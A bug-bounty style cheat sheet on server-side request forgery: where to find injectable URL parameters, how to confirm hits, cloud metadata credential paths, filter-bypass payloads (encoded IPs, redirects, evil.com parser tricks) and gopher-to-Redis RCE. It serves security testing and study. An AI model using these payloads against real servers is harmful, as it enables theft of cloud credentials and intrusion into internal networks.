# Server-Side Request Forgery (SSRF)

**TL;DR**: you force the server to issue a request to a destination you choose. Max impact in cloud: **metadata endpoint → creds → escalation**. PoC: callback to your collaborator, then internal pivots. Distinguish full-SSRF (visible response) vs blind-SSRF (OOB only).

## Where to look (anything taking a URL/hostname)
- Params: `url=`, `uri=`, `path=`, `dest=`, `redirect=`, `img=`, `image=`, `source=`, `domain=`, `callback=`, `webhook=`, `feed=`, `proxy=`, `fetch=`, `load=`, `to=`, `next=`, `data=`.
- Features: import from URL, "fetch from link", link preview/unfurl (Slack-like), avatar by URL, PDF/thumbnail generation (headless browser), outbound webhooks, SSO metadata/JWKS URL, XML/SVG (also XXE), image parsers (ffmpeg/ImageMagick → also RCE).
- Hidden formats: URL inside a JSON field, inside an uploaded file (SVG `xlink:href`, PDF, XML entity), inside an encoded parameter.

## Detection
- Put a Collaborator/interactsh URL in the param → DNS/HTTP hit = SSRF confirmed.
- Differentiate: **DNS-only** hit (server-side resolution) vs **HTTP** (full request). The latter = more exploitable.
- Full vs blind: is the remote response echoed in the page?

## Internal targets (after confirmation)
- **Cloud metadata (jackpot)**:
  - AWS: `http://169.254.169.254/latest/meta-data/`; IAM creds: `.../iam/security-credentials/<role>`. IMDSv2 needs header `X-aws-ec2-metadata-token` (token via PUT) → SSRF with header control.
  - GCP: `http://169.254.169.254/computeMetadata/v1/` with header `Metadata-Flavor: Google`. Header-less bypass (H1 #341876): the legacy `/computeMetadata/v1beta1/` path returns the same token WITHOUT the `Metadata-Flavor` header.
  - Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` header `Metadata: true`.
  - Alibaba: `http://100.100.100.200/latest/meta-data/`.
  - DigitalOcean: `http://169.254.169.254/metadata/v1/`.
- **Localhost / internal services**: `http://127.0.0.1:PORT/`, `http://localhost/admin`, actuator (`/actuator/env`, `/actuator/heapdump`), Redis (6379), Elasticsearch (9200), Kubernetes API (`https://kubernetes.default.svc`), internal admin panels, `file:///etc/passwd`.
- **Internal port scan**: vary the port, measure time/error (open vs closed vs filtered).

## Filter / allowlist bypass (see also 00_WAF_ENCODING.md)
- **IP representations**: `127.0.0.1` → `127.1`, `0177.0.0.1` (octal), `0x7f000001` (hex), `2130706433` (decimal), `[::1]`, `[::ffff:127.0.0.1]`, `0.0.0.0`, `127.0.0.1.nip.io`.
- **NAT64 / IPv6 mapping** (H1 #3634400): reach IPv4 internals via `64:ff9b::<ipv4>` and the local-use prefix `64:ff9b:1::/48`, often missed by IPv4-only filters.
- **DNS rebinding**: a domain whose resolution changes between validation and request (rebind services, `1u.ms`, `rebinder`). Beats resolution-based allowlists.
- **Redirect**: an allowed URL that **redirects** (302) to internal (`http://your.com/redirect?to=http://169.254.169.254`). The server follows the redirect. If 301/302 are not followed, try **303 See Other** (H1 #508459 followed 303 when others were blocked).
- **@ / userinfo**: `http://expected.com@169.254.169.254/`, `http://169.254.169.254#expected.com`, `http://169.254.169.254%2f%2f@...`.
- **URL parser confusion**: `http://expected.com\@evil.com`, `http://foo@evil.com:80@expected.com`, mixing `\`, `#`, `?`, `;`. Cf. Orange Tsai "A New Era of SSRF".
- **Alt schemes**: `file://`, `gopher://` (crafts raw TCP → Redis/SMTP/etc.), `dict://`, `ftp://`, `ldap://`, `http+unix://`, `netdoc://`.
- **Encoding**: double URL-encode, unicode dot, uppercase in the scheme.
- **Wildcard DNS**: `169.254.169.254.nip.io`, spoofed collaborator subdomains.
- **"localhost" blocklist**: use the other notations above.

## Gopher (blind → RCE via text services)
- `gopher://127.0.0.1:6379/_<URL-encoded Redis commands>` → write a key/cron/module → RCE (authorization required).
- Also for SMTP, MySQL, non-GET internal HTTP.

## Blind SSRF - what to do
- Confirm via OOB, then find a channel: differential errors, timing (port scan), side effects (metadata written somewhere, webhook triggered).
- Chain: blind SSRF + gopher, or SSRF + an internal endpoint that returns data elsewhere.

## Impact
- Cloud cred (IAM) theft → infra access = **Critical**.
- Internal service access / RCE via gopher.
- File read (`file://`).
- Internal network scan / SSRF-as-a-proxy.

## Caido
- **QuickSSRF plugin** (installed) as the OOB listener: generate its payload URL, drop it in the target param via Replay, read DNS/HTTP hits in the QuickSSRF panel (no external collaborator needed). If the Caido MCP exposes it, drive it directly; otherwise read the hit from the panel.
- Confirm the hit, then pivot to `169.254.169.254`, `localhost`, internal ports.
- Automate: iterate internal ports (time/length column = open/closed oracle).
- Match & Replace: inject the payload into a header (`Referer`, `X-Forwarded-Host`) if the fetch propagates them.

## References
- PortSwigger - SSRF - https://portswigger.net/web-security/ssrf
- PayloadsAllTheThings - SSRF - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
- OWASP - SSRF Prevention Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- OWASP WSTG - Testing for SSRF - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery
- Orange Tsai - A New Era of SSRF: Exploiting URL Parsers (Black Hat US-17) - https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
- HackTricks - SSRF - https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/
- Cloud metadata SSRF list - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#cloud-instances
- YesWeHack guide - SSRF - https://www.yeswehack.com/learn-bug-bounty/server-side-request-forgery-ssrf
